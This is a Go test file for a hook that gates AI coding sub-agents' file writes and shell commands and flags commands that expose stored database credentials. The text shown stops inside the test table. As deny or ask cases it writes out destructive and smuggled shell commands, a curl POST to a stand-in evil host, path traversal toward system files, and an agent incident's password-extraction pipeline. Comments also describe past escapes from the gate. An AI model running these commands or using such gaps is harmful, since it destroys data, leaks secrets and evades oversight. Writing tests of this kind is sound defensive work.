package cli

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// odysseusPayload builds a spawned-Odysseus PreToolUse payload — the shape the
// retired hooks/plan-mode-guard.cjs was built on.
func odysseusPayload(tool string, input map[string]any) string {
	return payloadJSON(map[string]any{
		"agent_type": "kratos:odysseus",
		"tool_name":  tool,
		"tool_input": input,
	})
}

func payloadJSON(m map[string]any) string {
	raw, err := json.Marshal(m)
	if err != nil {
		panic(err)
	}
	return string(raw)
}

// irisLedger is a session ledger for an inline Iris with files already counted.
// The list is []any because that is what a JSON round trip produces.
func irisLedger(files ...string) map[string]any {
	list := make([]any, 0, len(files))
	for _, f := range files {
		list = append(list, normalizeLedgerPath(f))
	}
	return map[string]any{
		"session_id":          "sess-1",
		"cwd":                 "C:/repo",
		"inline_god":          "iris",
		"inline_edited_files": list,
	}
}

func irisWrite(file string) string {
	return payloadJSON(map[string]any{
		"session_id": "sess-1",
		"cwd":        "C:/repo",
		"tool_name":  "Write",
		"tool_input": map[string]any{"file_path": file},
	})
}

// TestEditGateDecisions pins the whole gate policy: the 22 Odysseus cases
// ported from the retired plan-mode-guard.cjs (which only ever saw a *spawned*
// Odysseus), the five false denies that guard produced, Iris's per-turn file
// budget, and every fail-open path — including the regression that matters
// most, a spawned Ares under an exhausted Iris budget.
//
// Every case named "…allowed" expects want "" — no decision. The gate never
// emits "allow" (see the contract note in hook_editgate.go), so "permitted"
// and "fail open" are the same output here; TestGateNeverAllows pins that as a
// property over the whole table, and TestOdysseusBashClassification keeps the
// discrimination by asking the classifier directly.
func TestEditGateDecisions(t *testing.T) {
	cases := []struct {
		name           string
		payload        string
		ledger         map[string]any
		want           string   // "deny", "ask", or "" for no decision (permitted or fail open)
		wantFiles      []string // expected inline_edited_files write, nil for no write
		wantWrite      bool
		wantClear      bool   // expected inline_god clear
		wantSetGod     string // expected god a Skill load bound, "" for none
		reasonContains []string
	}{
		// ---- Odysseus writes (spawned — ported from hook_planguard_test.go) ----
		{
			name:    "draft plan write allowed",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/.Arena/tactical-plans/2026-07-28-thing.md"}),
			want:    "",
		},
		{
			name:    "per-answer edit of the draft allowed",
			payload: odysseusPayload("Edit", map[string]any{"file_path": "C:/repo/.claude/.Arena/tactical-plans/2026-07-28-thing.md"}),
			want:    "",
		},
		{
			name:    "spec delta write allowed",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/feature/2026-07-28-thing/spec-delta/planning.md"}),
			want:    "",
		},
		{
			// `kratos spec archive` moves promoted deltas into spec-delta/archived/.
			name:    "archived spec delta denied",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/feature/2026-07-28-thing/spec-delta/archived/planning.md"}),
			want:    "deny",
		},
		{
			name:    "other feature deliverables still denied",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/feature/2026-07-28-thing/prd.md"}),
			want:    "deny",
		},
		{
			name:           "spawned odysseus source write denied",
			payload:        odysseusPayload("Write", map[string]any{"file_path": "src/index.ts"}),
			want:           "deny",
			reasonContains: []string{"kratos:ares"},
		},
		// ---- Odysseus bash (ported) ----
		{
			// The protocol's own timestamp fallback shape must pass: the wrapper,
			// the stderr redirect and the `|| date` fallback are inert.
			name:    "protocol timestamp fallback allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `TS=$(kratos now 2>/dev/null || date -u +%Y-%m-%dT%H:%M:%SZ)`}),
			want:    "",
		},
		{
			name:    "session active allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `"C:/Users/x/.kratos/bin/kratos.exe" session active "C:/repo"`}),
			want:    "",
		},
		{
			name:    "pipeline get allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos pipeline get --compact --feature x"}),
			want:    "",
		},
		{
			name:    "memory list allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "~/.kratos/bin/kratos memory list --limit 40"}),
			want:    "",
		},
		{
			name:    "non-date fallback denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `TS=$(kratos now || rm -rf build)`}),
			want:    "deny",
		},
		{
			name:    "stripped redirect still catches a chained mutation",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos now 2>/dev/null; rm -rf build"}),
			want:    "deny",
		},
		{
			// The mutation blacklist matches \bmove\b, so a task title containing
			// "move" would deny the slug mint if the kratos allowlist were checked
			// after it.
			name:    "slug mint with a mutating word in the title allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `kratos slug --dated "move the sidebar"`}),
			want:    "",
		},
		{
			name:    "quoted absolute binary path allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `"C:/Program Files/kratos/kratos.exe" spec validate my-slug`}),
			want:    "",
		},
		{
			name:    "template get allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "~/.kratos/bin/kratos template get spec-delta-template"}),
			want:    "",
		},
		{
			name:    "chained command after an allowed kratos prefix denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `kratos slug -d "x" && rm -rf build`}),
			want:    "deny",
		},
		{
			name:    "command substitution after an allowed kratos prefix denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos slug --dated \"$(rm -rf build)\""}),
			want:    "deny",
		},
		{
			name:    "timestamp subcommand allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos now"}),
			want:    "",
		},
		{
			name:    "spec archive denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos spec archive my-slug"}),
			want:    "deny",
		},
		{
			name:    "pipeline update denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos pipeline update --feature x --stage 7 --status complete"}),
			want:    "deny",
		},
		{
			name:    "destructive shell denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "rm -rf build"}),
			want:    "deny",
		},
		{
			name:    "read-only git allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "git status"}),
			want:    "",
		},
		// ---- PowerShell: same classification as Bash, not a separate hole ----
		{
			name:    "PowerShell read-only Get-Content allowed",
			payload: odysseusPayload("PowerShell", map[string]any{"command": "Get-Content main.go"}),
			want:    "",
		},
		{
			name:    "PowerShell read-only Test-Path allowed",
			payload: odysseusPayload("PowerShell", map[string]any{"command": "Test-Path build"}),
			want:    "",
		},
		{
			name:           "PowerShell Remove-Item denied",
			payload:        odysseusPayload("PowerShell", map[string]any{"command": "Remove-Item -Recurse -Force build"}),
			want:           "deny",
			reasonContains: []string{"read-only inspection"},
		},
		{
			name:    "PowerShell Set-Content denied",
			payload: odysseusPayload("PowerShell", map[string]any{"command": "Set-Content -Path out.txt -Value 'x'"}),
			want:    "deny",
		},
		{
			name:    "PowerShell Move-Item denied",
			payload: odysseusPayload("PowerShell", map[string]any{"command": "Move-Item a.txt b.txt"}),
			want:    "deny",
		},
		{
			name:    "non-odysseus agents unaffected",
			payload: payloadJSON(map[string]any{"agent_type": "kratos:ares", "tool_name": "Write", "tool_input": map[string]any{"file_path": "src/index.ts"}}),
			want:    "",
		},
		// ---- the five false denies the JS guard produced on 2026-09-11 ----
		{
			name:    "sed range read allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `sed -n '1,20p' main.go`}),
			want:    "",
		},
		{
			name:    "head allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "head -50 internal/cli/hook.go"}),
			want:    "",
		},
		{
			name:    "tail allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "tail -20 build.log"}),
			want:    "",
		},
		{
			name:    "wc allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "wc -l agents/iris.md"}),
			want:    "",
		},
		{
			name:    "git -C read-only allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "git -C C:/repo status"}),
			want:    "",
		},
		{
			// The agent protocol mandates these calls for every agent; the JS
			// guard denied Odysseus his own ledger write.
			name:    "step record-agent allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `kratos step record-agent "sess-1" odysseus sonnet "plan the gate" --project "C:/repo"`}),
			want:    "",
		},
		{
			// Widening the allowlist must not widen it to writes.
			name:    "sed in place denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `sed -i 's/a/b/' main.go`}),
			want:    "deny",
		},
		{
			name:    "redirect after a read-only command denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "git status > out.txt"}),
			want:    "deny",
		},
		// ---- inline Odysseus (the ledger path the JS guard could never see) ----
		{
			name:    "inline odysseus source write denied",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/index.ts"}}),
			ledger:  map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:    "deny",
		},
		{
			name:    "inline odysseus plan write allowed",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/.claude/.Arena/tactical-plans/x.md"}}),
			ledger:  map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:    "",
		},
		// ---- Iris budget ----
		{
			name:      "first source file allowed and counted",
			payload:   irisWrite("C:/repo/src/a.ts"),
			ledger:    irisLedger(),
			want:      "",
			wantFiles: []string{"C:/repo/src/a.ts"},
			wantWrite: true,
		},
		{
			name:      "second source file allowed and counted",
			payload:   irisWrite("C:/repo/src/b.ts"),
			ledger:    irisLedger("C:/repo/src/a.ts"),
			want:      "",
			wantFiles: []string{"C:/repo/src/a.ts", "C:/repo/src/b.ts"},
			wantWrite: true,
		},
		{
			name:           "third distinct source file denied",
			payload:        irisWrite("C:/repo/src/c.ts"),
			ledger:         irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:           "deny",
			reasonContains: []string{`Task(subagent_type: "kratos:ares"`, "ORIGINAL_USER_REQUEST", "src/a.ts", "src/b.ts"},
		},
		{
			name:    "repeat edit of a counted file allowed",
			payload: irisWrite("C:/repo/src/a.ts"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "document allowed and uncounted",
			payload: irisWrite("C:/repo/README.md"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "claude bookkeeping allowed and uncounted",
			payload: irisWrite("C:/repo/.claude/feature/x/status.json"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "scratchpad allowed and uncounted",
			payload: irisWrite("C:/repo/tmp/claude/scratch/probe.ts"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "path outside cwd allowed and uncounted",
			payload: irisWrite("D:/elsewhere/src/d.ts"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "bash never gated for iris",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Bash", "tool_input": map[string]any{"command": "rm -rf build"}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "cwd falls back to the ledger",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "deny",
		},
		// ---- budget reset on dispatch ----
		{
			name:      "spawning ares clears the budget",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:ares"}}),
			ledger:    irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:      "",
			wantFiles: []string{},
			wantWrite: true,
		},
		{
			name:      "spawning hades clears the budget",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Task", "tool_input": map[string]any{"subagent_type": "kratos:hades"}}),
			ledger:    irisLedger("C:/repo/src/a.ts"),
			want:      "",
			wantFiles: []string{},
			wantWrite: true,
		},
		{
			name:      "spawning hermes does not clear the budget",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:hermes"}}),
			ledger:    irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:      "",
			wantWrite: false,
		},
		// ---- bypass ----
		{
			name:    "explicit user instruction stands the gate down",
			payload: irisWrite("C:/repo/src/c.ts"),
			ledger: map[string]any{
				"inline_god":          "iris",
				"cwd":                 "C:/repo",
				"gate_bypass":         true,
				"inline_edited_files": []any{"c:/repo/src/a.ts", "c:/repo/src/b.ts"},
			},
			want: "",
		},
		// ---- fail open ----
		{
			name:    "no ledger file",
			payload: irisWrite("C:/repo/src/c.ts"),
			ledger:  nil,
			want:    "",
		},
		{
			name:    "empty inline god",
			payload: irisWrite("C:/repo/src/c.ts"),
			ledger:  map[string]any{"session_id": "sess-1", "cwd": "C:/repo"},
			want:    "",
		},
		{
			name:    "god with no rule",
			payload: irisWrite("C:/repo/src/c.ts"),
			ledger:  map[string]any{"inline_god": "hermes", "cwd": "C:/repo", "inline_edited_files": []any{"a", "b"}},
			want:    "",
		},
		{
			name:    "missing session id",
			payload: payloadJSON(map[string]any{"cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			// The regression that matters most: Ares must never be denied, even
			// when the inline god's budget is spent. Without the agent_type
			// discriminator this gate would break the dispatch it exists to create.
			name: "spawned ares under an exhausted iris budget",
			payload: payloadJSON(map[string]any{
				"session_id": "sess-1", "cwd": "C:/repo", "agent_type": "kratos:ares",
				"tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
			}),
			ledger: irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:   "",
		},
		{
			// agent_id is the other subagent-only key; either one marks a
			// spawned payload.
			name: "spawned agent identified by agent_id alone",
			payload: payloadJSON(map[string]any{
				"session_id": "sess-1", "cwd": "C:/repo", "agent_id": "agent-7",
				"tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
			}),
			ledger: irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:   "",
		},
		{
			// A top-level subagent_type is NOT part of a spawned payload
			// (agent_type/agent_id are). Honoring it would let anything that
			// sets the key opt out of the gate, so the inline rule still runs.
			name: "top-level subagent_type is not a spawn marker",
			payload: payloadJSON(map[string]any{
				"session_id": "sess-1", "cwd": "C:/repo", "subagent_type": "kratos:ares",
				"tool_name": "Write", "tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
			}),
			ledger: irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:   "deny",
		},
		// ---- Odysseus hands off: the dispatch ends his turn ----
		{
			// Without this exit one /kratos:plan locked the session: a plain
			// user turn ("approve") keeps the god and every later Write stayed
			// denied for the rest of the session.
			name:      "dispatching to ares clears inline odysseus",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:ares"}}),
			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:      "",
			wantClear: true,
		},
		{
			name:      "dispatching to hades clears inline odysseus",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Task", "tool_input": map[string]any{"subagent_type": "kratos:hades"}}),
			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:      "",
			wantClear: true,
		},
		{
			// Only a builder takes the work. Clearing on any kratos:<god> made
			// the lock a one-call escape: Odysseus's own protocol tells him to
			// spawn kratos:metis for grounding, and that spawn unlocked the
			// session for the rest of the turn.
			name:      "dispatching to metis for grounding does not clear inline odysseus",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Task", "tool_input": map[string]any{"subagent_type": "kratos:metis"}}),
			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:      "",
			wantClear: false,
		},
		{
			name:      "dispatching to hermes for a review does not clear inline odysseus",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Task", "tool_input": map[string]any{"subagent_type": "kratos:hermes"}}),
			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:      "",
			wantClear: false,
		},
		{
			name:      "a non-kratos spawn does not clear odysseus",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "general-purpose"}}),
			ledger:    map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:      "",
			wantClear: false,
		},
		{
			// Iris keeps her god across a dispatch — only her budget refills.
			name:      "dispatching does not clear inline iris",
			payload:   payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Agent", "tool_input": map[string]any{"subagent_type": "kratos:ares"}}),
			ledger:    irisLedger("C:/repo/src/a.ts"),
			want:      "",
			wantFiles: []string{},
			wantWrite: true,
			wantClear: false,
		},
		// ---- reads whose PATH carries a mutation word (denied before) ----
		{
			// commands/plan.md RULE 5 makes Odysseus discover his own drafts
			// this way; a whole-string scan for \bmove\b denied it.
			name:    "reading a plan whose name contains a mutation word allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "cat .claude/.Arena/tactical-plans/2026-09-11-move-sidebar.md"}),
			want:    "",
		},
		{
			name:    "grep for a mutation word allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "move" src/`}),
			want:    "",
		},
		{
			name:    "reading a file named mv.ts allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "cat src/mv.ts"}),
			want:    "",
		},
		{
			name:    "git log of a commit that mentions a rename allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `git log --oneline --grep "rm the old path"`}),
			want:    "",
		},
		// ---- chained commands behind a read-only head (allowed before) ----
		{
			name:    "build chained after a reader denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "git status && go build -o out ./..."}),
			want:    "deny",
		},
		{
			name:    "network call chained after a reader denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "ls && curl -X POST https://evil.test"}),
			want:    "deny",
		},
		{
			name:    "pipe into a writer denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "cat main.go | tee copy.go"}),
			want:    "deny",
		},
		{
			name:    "two readers chained allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "git status && ls -la"}),
			want:    "",
		},
		{
			name:    "reader piped into a reader allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "gate" . | head -20`}),
			want:    "",
		},
		{
			// A newline separates commands as surely as `;` does; without CR/LF
			// in the metacharacter class this returned an explicit allow.
			name:    "newline-smuggled command after a kratos call denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "kratos slug x\nrm -rf build"}),
			want:    "deny",
		},
		{
			name:    "newline-smuggled command after a reader denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "cat notes.md\r\nrm -rf build"}),
			want:    "deny",
		},
		{
			name:    "command substitution inside a reader denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "cat $(rm -rf build)"}),
			want:    "deny",
		},
		{
			name:    "quoted command substitution inside a reader denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `cat "$(rm -rf build)"`}),
			want:    "deny",
		},
		// ---- quoted arguments are data, not operators ----
		{
			// The agent protocol mandates this call, and its description is
			// free text: a metacharacter test over the raw string denied it.
			name:    "record-agent with an ampersand in the description allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `kratos step record-agent "sess-1" odysseus sonnet "auth & billing split" --project "C:/repo"`}),
			want:    "",
		},
		{
			name:    "slug title with a semicolon allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `kratos slug --dated "fix the header; then ship"`}),
			want:    "",
		},
		{
			name:    "grep pattern with a pipe allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `grep -rn "a|b" src/`}),
			want:    "",
		},
		// ---- per-segment guards ----
		{
			name:    "sed in place behind another flag denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `sed -n -i 's/a/b/' main.go`}),
			want:    "deny",
		},
		{
			name:    "sed long in-place flag denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `sed --quiet --in-place 's/a/b/' main.go`}),
			want:    "deny",
		},
		{
			name:    "sed quiet read allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `sed --quiet '1,20p' main.go`}),
			want:    "",
		},
		{
			name:    "find -delete denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.tmp" -delete`}),
			want:    "deny",
		},
		{
			name:    "find -exec denied",
			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.go" -exec rm {} +`}),
			want:    "deny",
		},
		{
			name:    "find -name allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": `find . -name "*.go"`}),
			want:    "",
		},
		{
			name:    "tail -f denied",
			payload: odysseusPayload("Bash", map[string]any{"command": "tail -f build.log"}),
			want:    "deny",
		},
		{
			name:    "tail -n allowed",
			payload: odysseusPayload("Bash", map[string]any{"command": "tail -n 20 build.log"}),
			want:    "",
		},
		// ---- path shapes (W1, W5) ----
		{
			name:    "write with no file path fails open",
			payload: odysseusPayload("Write", map[string]any{}),
			want:    "",
		},
		{
			name:    "write with an unrecognized path key fails open",
			payload: odysseusPayload("Edit", map[string]any{"target_file": "src/index.ts"}),
			want:    "",
		},
		{
			name:    "notebook edit reaches the odysseus rule through notebook_path",
			payload: odysseusPayload("NotebookEdit", map[string]any{"notebook_path": "C:/repo/src/analysis.ipynb"}),
			want:    "deny",
		},
		{
			name:    "traversal out of the plan directory denied",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/.Arena/tactical-plans/../../../../etc/passwd.md"}),
			want:    "deny",
		},
		{
			name:    "plan path outside the payload cwd denied",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{"file_path": "D:/elsewhere/.claude/.Arena/tactical-plans/x.md"}}),
			ledger:  map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:    "deny",
		},
		{
			name:    "spec delta traversal denied",
			payload: odysseusPayload("Write", map[string]any{"file_path": ".claude/feature/x/spec-delta/../../../secrets.md"}),
			want:    "deny",
		},
		// ---- one path normalizer (W10) ----
		{
			name:    "doubled separators are the same counted file",
			payload: irisWrite("C:/repo//src//a.ts"),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "windows separators and drive case are the same counted file",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": `c:\repo`, "tool_name": "Edit", "tool_input": map[string]any{"file_path": `C:\repo\src\a.ts`}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		{
			name:    "iris notebook edit counts as a source file",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "NotebookEdit", "tool_input": map[string]any{"notebook_path": "C:/repo/src/analysis.ipynb"}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "deny",
		},
		{
			name:    "iris write with no file path fails open",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Write", "tool_input": map[string]any{}}),
			ledger:  irisLedger("C:/repo/src/a.ts", "C:/repo/src/b.ts"),
			want:    "",
		},
		// ---- credential guard (Fix 3) ----
		{
			// Case 1: the 2026-09-15 KPIM incident's own command, shape verbatim
			// with host, database, user name and file paths replaced by
			// placeholders. Two independent matches: the grep -o | cut pipeline
			// extracting Password=, and the sqlcmd -P invocation.
			name: "incident command asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `CFG=app/Web.config && CS=$(sed -n '104p' "$CFG") && SRV=$(echo "$CS" | grep -o 'Server=tcp:[^,;]*' | cut -d: -f2) && DB=$(echo "$CS" | grep -o 'Initial Catalog=[^;]*' | cut -d= -f2) && UID_=$(echo "$CS" | grep -o 'User ID=[^;]*' | cut -d= -f2) && PW=$(echo "$CS" | grep -o 'Password=[^;]*' | cut -d= -f2) && echo "server=$SRV db=$DB user=$UID_" && cat > "$TMPDIR/verify.sql" <<'EOF'
SELECT 1;
EOF
sqlcmd -S "$SRV" -d "$DB" -U "$UID_" -P "$PW" -C -l 30 -W -i "$TMPDIR/verify.sql"`}}),
			want:           "ask",
			reasonContains: []string{"stored credentials", "mssql MCP"},
		},
		{
			// A spawned Ares runs through the same guard, before the
			// spawned-subagent branch — this is the whole reason step 0 sits
			// ahead of it in editGateDecision.
			name:    "incident command asks even from a spawned ares",
			payload: payloadJSON(map[string]any{"agent_type": "kratos:ares", "tool_name": "Bash", "tool_input": map[string]any{"command": `grep -o 'Password=[^;]*' Web.config | cut -d= -f2`}}),
			want:    "ask",
		},
		{
			name:    "mysql lowercase -p attached asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "mysql -uroot -pSecret123 -e 'select 1'"}}),
			want:    "ask",
		},
		{
			name:    "mysql --password asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "mysqldump --password=hunter2 mydb > out.sql"}}),
			want:    "ask",
		},
		{
			// mysql's own -P sets the port, not a credential — case matters.
			name:    "mysql uppercase -P for the port stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "mysql -uroot -P 3306 -e 'select 1'"}}),
			want:    "",
		},
		{
			name:    "PGPASSWORD env var before psql asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `PGPASSWORD=hunter2 psql -h localhost -U app -d appdb -c "select 1"`}}),
			want:    "ask",
		},
		{
			name:    "mongo URI with embedded user:pass asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `mongosh "mongodb://app:hunter2@localhost:27017/appdb"`}}),
			want:    "ask",
		},
		{
			name:    "redis-cli -a asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "redis-cli -a hunter2 ping"}}),
			want:    "ask",
		},
		{
			name:    "PowerShell Invoke-Sqlcmd -Password asks",
			payload: payloadJSON(map[string]any{"tool_name": "PowerShell", "tool_input": map[string]any{"command": `Invoke-Sqlcmd -ServerInstance srv -Database db -Username app -Password hunter2 -Query "select 1"`}}),
			want:    "ask",
		},
		{
			name:    "grep -rn for a config key name stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `grep -rn "connectionString" --include=*.cs .`}}),
			want:    "",
		},
		{
			// Reports the line a secret sits on, never the value: -n has no 'o'.
			name:    "grep -n Password without -o stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `grep -n "Password" src/Login.tsx`}}),
			want:    "",
		},
		{
			name:    "dotnet ef database update stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "dotnet ef database update"}}),
			want:    "",
		},
		{
			name:    "git log -p stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "git log -p"}}),
			want:    "",
		},
		{
			name:    "sqlcmd help flag stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "sqlcmd -?"}}),
			want:    "",
		},
		{
			name:    "psql --version stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "psql --version"}}),
			want:    "",
		},
		{
			name:    "a kratos command stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "kratos pipeline get --compact --feature x"}}),
			want:    "",
		},
		{
			// sqlcmd/bcp accept the password attached, no space before the value.
			name:    "sqlcmd attached password with no space asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "sqlcmd -S host -U app -PSecret123 -C"}}),
			want:    "ask",
		},
		{
			name:    "sqlcmd attached quoted variable password asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `sqlcmd -S "$SRV" -U "$UID_" -P"$PW" -C`}}),
			want:    "ask",
		},
		{
			name:    "SQLCMDPASSWORD env var asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "SQLCMDPASSWORD=hunter2 sqlcmd -S host -U app -C"}}),
			want:    "ask",
		},
		{
			name:    "MYSQL_PWD env var asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": "MYSQL_PWD=hunter2 mysql -uroot -e 'select 1'"}}),
			want:    "ask",
		},
		{
			// sqlcmd's lowercase -p prints statistics, not a credential.
			name:    "sqlcmd lowercase -p statistics flag stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `sqlcmd -p -S host -E -Q "select 1"`}}),
			want:    "",
		},
		{
			// mysql's uppercase -P sets the port, not a credential.
			name:    "mysql uppercase -P port with a host flag stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `mysql -P 3306 -h host -e "select 1"`}}),
			want:    "",
		},
